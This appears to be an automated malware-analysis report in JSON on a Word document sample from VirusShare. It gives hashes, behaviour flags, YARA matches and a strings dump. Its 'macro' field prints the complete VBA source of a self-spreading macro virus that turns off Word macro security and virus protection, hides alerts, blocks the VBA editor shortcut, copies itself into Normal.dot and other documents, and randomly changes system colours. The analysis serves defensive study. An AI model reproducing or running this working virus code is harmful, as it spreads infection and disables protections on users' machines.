{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "CodeModule": "May attempt to modify the VBA code",
            "Command": "May run PowerShell commands",
            "Document_Close": "Runs when the Word document is closed",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Lib": "May run code from a DLL",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "System": "May run an executable file or a system command on a Mac",
            "VBProject": "May attempt to modify the VBA code",
            "Windows": "May enumerate application windows",
            "vbcomponents": "May attempt to modify the VBA code"
        },
        "macro": "Private Declare Function SetSysColors Lib \"user32\" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long\nPrivate Sub Document_Open()\n' LSD\n' By The WalruS 09/00 v1.00\n\n    On Error Resume Next\n    \n    Randomize\n\n    If Left(ActiveDocument.Name, 8) = \"Document\" Then Exit Sub\n    \n   Select Case Application.Version\n    \n    Case \"9.0\"\n        System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&\n        CommandBars(\"Macro\").Controls(\"Security...\").Enabled = False\n    \n    Case \"8.0\"\n        Options.VirusProtection = False\n        Options.SaveNormalPrompt = False\n        Options.ConfirmConversions = False\n    End Select\n     \n    With Application\n        .ScreenUpdating = False\n        .DisplayStatusBar = False\n        .DisplayAlerts = False\n    End With\n    \n    KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=\" \"\n\n    Set nor = NormalTemplate.VBProject.vbcomponents(1).CodeModule\n    Set doc = ActiveDocument.VBProject.vbcomponents(1).CodeModule\n\n    ChangeHook = Int(Rnd * 2)\n    Select Case ChangeHook\n    \n    Case 0\n        Hook = \"Private Sub Document_Open()\"\n        \n    Case 1\n        Hook = \"Private Sub Document_Close()\"\n    \n    End Select\n    \n    Open \"C:\\Windows\\\" & Day(Now) & \".sys\" For Output As #1\n    Print #1, \"Private Declare Function SetSysColors Lib \"\"user32\"\" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long\"\n    Print #1, Hook\n    Print #1, VBProject.vbcomponents(1).CodeModule.Lines(3, 110)\n    Close #1\n\n    If nor.Lines(3, 1) <> \"' LSD\" Then\n        nor.DeleteLines 1, nor.CountOfLines\n        nor.AddFromFile (\"C:\\Windows\\\" & Day(Now) & \".sys\")\n        NormalTemplate.Save\n    ElseIf doc.Lines(3, 1) <> \"' LSD\" Then\n        doc.DeleteLines 1, doc.CountOfLines\n        doc.AddFromFile (\"C:\\Windows\\\" & Day(Now) & \".sys\")\n    End If\n\n    With Dialogs(wdDialogFileSummaryInfo)\n        .Author = \"WalruS\"\n        .Title = \"CandyFlippin\"\n        .Execute\n    End With\n    \n    TimeCheck = Second(Now)\n    One = Left(TimeCheck, 1)\n    Two = Right(TimeCheck, 1)\n    If One = Two Then Call CandyFlip\n   \n     NormalTemplate.Saved = True\n    If ActiveDocument.Saved <> True Then ActiveDocument.Save\n\nEnd Sub\n\nPrivate Sub CandyFlip()\n    On Error Resume Next\n    a = SetSysColors(1, 1, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 2, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 3, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 4, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 5, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 6, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 7, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 8, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 9, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 10, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 11, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 12, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 13, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 14, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 15, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 16, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 17, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 18, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 19, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 20, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 21, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 22, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 23, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 24, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 25, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 26, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\n    a = SetSysColors(1, 27, RGB(Rnd * 255, Rnd * 255, Rnd * 255))\nEnd Sub\n"
    },
    "filename": "VirusShare_23c07a5c5fbb52fc8315edc39e2e97e4",
    "filesize": 34816,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.90, Code page: 1252, Title: CandyFlippin, Author: WalruS, Template: Normal.dot, Last Saved By: The WalruS, Revision Number: 2, Name of Creating Application: Microsoft Word 9.0, Create Time/Date: Sat Sep 23 20:36:00 2000, Last Saved Time/Date: Sat Sep 23 20:37:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "23c07a5c5fbb52fc8315edc39e2e97e4",
        "sha1": "ab1099ad738149a8f2550c8c0ffdfe3fe814a33e",
        "sha256": "41a320f12c3570b683806c963d84a6e564db97f10ab3b81aa71dfe266a0bbd19"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjU",
            "/ =!",
            "$I%I",
            "CandyFlippin",
            "WalruS",
            "Normal.dot",
            "The WalruS",
            "Microsoft Word 9.0",
            "The WalruS Loves You For!",
            "CandyFlippin",
            "Title",
            "CustomlizC1P",
            "? Funct",
            "ion SetS",
            "ysColors",
            " Lib \"us",
            "er32\" (B",
            "yVal nChanges A",
            "ong, lp",
            "?Sub _",
            "Open()",
            " ' LSD",
            " The Wal",
            "ruS 09/0",
            "0 v1.00",
            "Error Res Next",
            "Rand>@U",
            "If Left(RA@;veE",
            "r, 8)",
            "pxit )",
            "Select CApplicaN.VersPH",
            "\"9.0",
            "tem.@Pro fileS",
            "(\"\", \"HK",
            "EY_CURRE",
            "NT_USER\\ Softw\\M icros@",
            "\\O@ffice\\",
            "Word\\Sec urity",
            "Level\"A31&C#!",
            "CommCBa@rs(\"Ma",
            ").ControFl@",
            "84OpA@s.Virus4t",
            "Save@",
            "mpt@^T",
            "@(firm",
            "End@Ad:",
            "With 3",
            ".ScreenHUpd6ng/",
            "DisjySta",
            "tus%W",
            "Ale<rt",
            "yBinding@s.Add ",
            "ode:=Bui$ld",
            "t, \"",
            "F11)",
            "@ugory:",
            "=0, 8:=\"N J",
            "v n`=F c*",
            ".VB+j",
            "1.vbcompDon",
            "?deModul`c",
            "doc@",
            "cHook",
            "nt(R3* 2zc",
            "aj{w",
            "D\t\"(kh",
            "Cl()",
            " \"C:",
            "9ows\\\"",
            " & Day(N",
            "ow)@",
            "\".sy",
            "s\" F0Outhput#",
            "npt #1{E",
            ">le.L",
            "ines(3, 110$<)",
            ") <> \"_\"",
            "CoupntOfb",
            "iFromF (>3",
            "E0| ",
            "MDialogs",
            "Su]@ryInfo",
            ".AuthA\"st",
            "\t.Tit",
            "ayFlippin\t",
            "Ex`et$Bq",
            "TimeC",
            "dond0",
            "\tTwoPBRight(",
            "%`ntll@",
            "\u03c8\u0148ap",
            " , RGB",
            "R557",
            ", 4?",
            ", 6?",
            "o)DO%O%1",
            " a = Set",
            "SysColor",
            "s(1, 22,",
            " RGB(Rnd * 255",
            "(`))",
            "3]?4?B",
            "<6B7",
            "SetSysColors",
            "fN-s@z",
            "7bHznL",
            "OIKh",
            "OIKh",
            "0sfN-s@z",
            " LSD",
            " By The WalruS 09/00 v1.00",
            "Document",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "Security...",
            "Macro",
            "Private Sub Document_Open()",
            "Private Sub Document_Close()'",
            "C:\\Windows\\",
            ".sys",
            "Private Declare Function SetSysColors Lib \"user32\" (ByVal nChanges As Long, lpSysColor As Long, lpColorValues As Long) As Long",
            "' LSD",
            "C:\\Windows\\",
            ".sys",
            "' LSD",
            "C:\\Windows\\",
            ".sys",
            "WalruS9",
            "CandyFlippin9",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "FJnqU",
            "Wordk",
            "Win16~",
            "Win32",
            "VBA6#",
            "Project1",
            "stdole`",
            "Project-",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "SetSysColors",
            "nChanges2",
            "lpSysColor",
            "lpColorValues'E",
            "user32*",
            "Document_Open",
            "Documentj",
            "ActiveDocument\\",
            "Application*",
            "Version",
            "Systema",
            "PrivateProfileString[",
            "CommandBars",
            "ControlsK",
            "Enabled\u06ea",
            "Options",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "ConfirmConversions",
            "ScreenUpdating!",
            "DisplayStatusBar",
            "DisplayAlerts",
            "KeyBindingsm2",
            "Addr",
            "KeyCode",
            "BuildKeyCodep",
            "wdKeyAlt",
            "wdKeyF11",
            "KeyCategoryX",
            "Command]",
            "nor!",
            "NormalTemplateq",
            "VBProjectOh",
            "vbcomponents",
            "CodeModule",
            "ChangeHook-",
            "RndR",
            "Hook",
            "Now%",
            "Lines",
            "DeleteLines",
            "CountOfLines!\\",
            "AddFromFileu",
            "Save",
            "Dialogs",
            "wdDialogFileSummaryInfo",
            "Author",
            "Title~",
            "ExecuteY",
            "TimeCheck",
            "Seconds",
            "OneH",
            "Two7",
            "Right",
            "CandyFlipg",
            "Savedd",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "c2.tlb#O",
            "LE Automation",
            "D@NormalDNABr",
            "A!OfficfOA`f",
            "!G{2DF",
            "8D04C-5B",
            "FA-101B-BDE5fAAd",
            "2fgra",
            "m Files\\",
            "Microsof",
            "MSO@9.DLL#",
            " @9.0 Ob",
            " LibraryCE",
            "aThisD",
            "ocumentGD",
            "h1sD",
            "uEeT",
            ",!C\"B",
            "*\\CNormalrU",
            "WG,[",
            "ThisDocument",
            "Project",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA6\\VBE6.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD9.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\stdole2.tlb",
            "stdole",
            "C:\\Program Files\\Microsoft Office\\Office\\MSO9.DLL",
            "Office",
            "fN-s@z",
            "HznL",
            "OIKh",
            "Document",
            "SetSysColors",
            "user32",
            "SetSysColors",
            "Document_Open",
            "CandyFlip",
            "nChanges",
            "lpSysColor",
            "lpColorValuesc",
            "ThisDocument",
            "ID=\"{EC35781C-A9E4-4EEF-A685-4620555D226D}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompatible32=\"393222000\"",
            "CMG=\"6062874D8B4D8B4D8B4D8B\"",
            "DPB=\"C0C227A828A828A8\"",
            "GC=\"2022C708C808C8F7\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 557, 359, Z",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA6\\VBE6.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSO9.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD9.OLB": "Autogen"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.292730",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
